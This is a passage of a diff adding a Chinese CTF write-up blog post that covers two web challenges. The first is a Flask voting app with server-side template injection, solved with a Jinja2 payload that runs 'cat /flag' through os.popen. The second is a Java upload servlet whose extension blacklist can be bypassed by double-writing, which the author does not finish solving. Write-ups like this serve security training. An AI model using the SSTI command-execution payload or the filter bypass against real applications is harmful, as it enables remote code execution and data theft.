+    vote_flag_num <span class="token operator">=</span> votelog<span class="token punctuation">.</span>flag
+    <span class="token keyword">if</span> vote_flag_num <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'?? fxck!'</span>
+    template <span class="token operator">=</span>  <span class="token triple-quoted-string string">'''
+    Congratulations, %s. You can get flag now!
+    '''</span> <span class="token operator">%</span> session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
+    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">vote_for_somebody</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> target <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'not in flag'</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+    session<span class="token punctuation">[</span>target<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>
+    <span class="token comment">#sleep(1)</span>
+    
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> threaded<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到success路由处存在明显的SSTI</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/success'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> name <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'?? fxck!'</span>
+    votelog <span class="token operator">=</span> VoteLog<span class="token punctuation">.</span>query<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>VoteLog<span class="token punctuation">.</span>username <span class="token operator">==</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    vote_flag_num <span class="token operator">=</span> votelog<span class="token punctuation">.</span>flag
+    <span class="token keyword">if</span> vote_flag_num <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'?? fxck!'</span>
+    template <span class="token operator">=</span>  <span class="token triple-quoted-string string">'''
+    Congratulations, %s. You can get flag now!
+    '''</span> <span class="token operator">%</span> session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
+    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但前提是你投给flag 8票</p>
+<p>随便用个用户名登陆后跳转到投票位置</p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114173930287.png" alt="image-20211114173930287"></p>
+<p>（我上午10点多看这个题的时候flag还只有80多票，现在下午5点41分，它已经快4万票了😂）</p>
+<p>这里俺是用的两个浏览器同时用一个用户名登陆，然后各投4票，结果就是8票。。不知道是不是非预期。</p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114174626249.png" alt="image-20211114174626249"></p>
+<p>然后用rce的payload做用户名就行了</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114174838916.png" alt="image-20211114174838916"></p>
+<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>l3hsec</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>fileupload<span class="token punctuation">.</span></span><span class="token class-name">FileItem</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>fileupload<span class="token punctuation">.</span>disk<span class="token punctuation">.</span></span><span class="token class-name">DiskFileItemFactory</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>fileupload<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletFileUpload</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>UUID<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Matcher</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span><span class="token punctuation">;</span>
+
+<span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/UploadServlet"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UploadServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 上传文件存储目录</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> UPLOAD_DIRECTORY <span class="token operator">=</span> <span class="token string">"upload"</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 上传配置</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> MEMORY_THRESHOLD <span class="token operator">=</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> MAX_FILE_SIZE <span class="token operator">=</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> MAX_REQUEST_SIZE <span class="token operator">=</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/**
+     * 上传数据及保存文件
+     */</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span>
+                          <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+
+        response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        <span class="token class-name">DiskFileItemFactory</span> factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DiskFileItemFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        factory<span class="token punctuation">.</span><span class="token function">setSizeThreshold</span><span class="token punctuation">(</span>MEMORY_THRESHOLD<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        factory<span class="token punctuation">.</span><span class="token function">setRepository</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.io.tmpdir"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">ServletFileUpload</span> upload <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletFileUpload</span><span class="token punctuation">(</span>factory<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        upload<span class="token punctuation">.</span><span class="token function">setFileSizeMax</span><span class="token punctuation">(</span>MAX_FILE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        upload<span class="token punctuation">.</span><span class="token function">setSizeMax</span><span class="token punctuation">(</span>MAX_REQUEST_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        upload<span class="token punctuation">.</span><span class="token function">setHeaderEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        <span class="token class-name">String</span> userDir <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getRemoteAddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> uploadPath <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> UPLOAD_DIRECTORY <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> userDir<span class="token punctuation">;</span>
+
+
+        <span class="token class-name">File</span> uploadDir <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>uploadPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>uploadDir<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            uploadDir<span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">FileItem</span><span class="token punctuation">></span></span> formItems <span class="token operator">=</span> upload<span class="token punctuation">.</span><span class="token function">parseRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>formItems <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> formItems<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">FileItem</span> item <span class="token operator">:</span> formItems<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>item<span class="token punctuation">.</span><span class="token function">isFormField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        <span class="token class-name">String</span> fileName <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileName<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                            <span class="token class-name">PrintWriter</span> writer <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            writer<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Error: 缺少文件后缀！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            writer<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token keyword">return</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">&#125;</span>
+
+
+                        <span class="token class-name">String</span> ext <span class="token operator">=</span> fileName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>fileName<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        ext <span class="token operator">=</span> <span class="token function">checkExt</span><span class="token punctuation">(</span>ext<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                        <span class="token class-name">String</span> filePath <span class="token operator">=</span> uploadPath <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> <span class="token function">randName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> ext<span class="token punctuation">;</span>
+                        <span class="token class-name">File</span> storeFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                        <span class="token class-name">String</span> content <span class="token operator">=</span> item<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">boolean</span> check <span class="token operator">=</span> <span class="token function">checkValidChars</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>check<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"上传失败：检测到可见字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token keyword">return</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">&#125;</span>
+
+                        <span class="token comment">//居然被绕过了，得再加一层过滤</span>
+                        <span class="token class-name">BlackWordsDetect</span> blackWordsDetect <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BlackWordsDetect</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">boolean</span> detectResult <span class="token operator">=</span> blackWordsDetect<span class="token punctuation">.</span><span class="token function">detect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>detectResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"上传失败：检测到黑名单关键字！ "</span> <span class="token operator">+</span> blackWordsDetect<span class="token punctuation">.</span><span class="token function">getBlackWord</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token keyword">return</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                            item<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>storeFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"文件上传成功! 文件路径: "</span> <span class="token operator">+</span> filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">&#125;</span>
+                    <span class="token punctuation">&#125;</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>
+                    <span class="token string">"上传失败：错误原因: "</span> <span class="token operator">+</span> ex<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> ret <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span> m<span class="token punctuation">;</span>
+            m <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"MD5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            m<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span>BigInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">randName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+        <span class="token keyword">return</span> UUID<span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">checkValidChars</span><span class="token punctuation">(</span><span class="token class-name">String</span> content<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Pattern</span> pattern <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"[a-zA-Z0-9]&#123;2,&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Matcher</span> matcher <span class="token operator">=</span> pattern<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> matcher<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">checkExt</span><span class="token punctuation">(</span><span class="token class-name">String</span> ext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        ext <span class="token operator">=</span> ext<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> blackExtList <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+                <span class="token string">"jsp"</span><span class="token punctuation">,</span> <span class="token string">"jspx"</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> blackExt <span class="token operator">:</span> blackExtList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>ext<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>blackExt<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                ext <span class="token operator">=</span> ext<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>blackExt<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">return</span> ext<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>jsp文件上传?，给了源码，jsp后缀可以双写绕过，但不能有连续的字母数字那里不知道怎么绕，等wp了，感觉这个题挺有意思的。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/13/thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="thinkphp5.0.24反序列化漏洞复现">
+      <i class="fa fa-chevron-left"></i> thinkphp5.0.24反序列化漏洞复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/11/21/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/" rel="next" title="buu刷题记录1">
+      buu刷题记录1 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
